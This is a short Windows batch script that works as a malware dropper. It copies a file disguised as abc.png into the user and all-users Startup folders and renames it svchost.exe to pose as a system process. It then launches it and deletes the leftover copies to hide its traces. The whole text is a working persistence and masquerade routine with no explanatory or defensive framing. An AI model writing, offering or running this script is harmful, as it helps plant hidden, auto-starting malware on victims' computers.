

echo f|xcopy /f ".\abc.png" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.png" "svchost.exe"

start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"


echo f|xcopy ".\abc.png" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc.png" "svchost.exe"

del ".\abc.png"
del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.png"